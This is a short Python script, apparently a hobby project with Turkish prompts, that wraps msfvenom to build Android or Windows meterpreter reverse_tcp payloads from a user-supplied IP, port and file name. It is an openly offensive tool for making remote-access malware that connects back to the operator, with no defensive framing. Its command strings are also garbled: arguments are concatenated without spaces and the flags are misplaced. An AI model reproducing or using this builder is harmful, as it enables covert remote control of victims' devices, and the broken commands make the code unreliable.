# Aven3xploit
Örnek Proje 

import os

os.system("apt install figlet")
os.system("figlet Hosgeldin Aven !!")

ip = input("Local veya Dış IP Gir: ")
port = input("Portunuz : ")

kytyrı = input("Kayıt Edilecek Dosya Yolu : ")

giris8 = """
================
[1] Android Exploit  <===
[2] Windows Exploit  <===
===============
      """
print(giris8)

apk = input("Exploit'in Adını Giriniz : ")
payload = input("Numara Seç : ")

if payload == '1':
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=" + port + "-f -o" + kytyrı + "R >" + apk)
    
if payload == '2':
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + "LPORT=" + port + "-f exe" + kytyrı)

#=================================
#Superman Tarafından Yapılmıştır.
#Aven William
#=================================
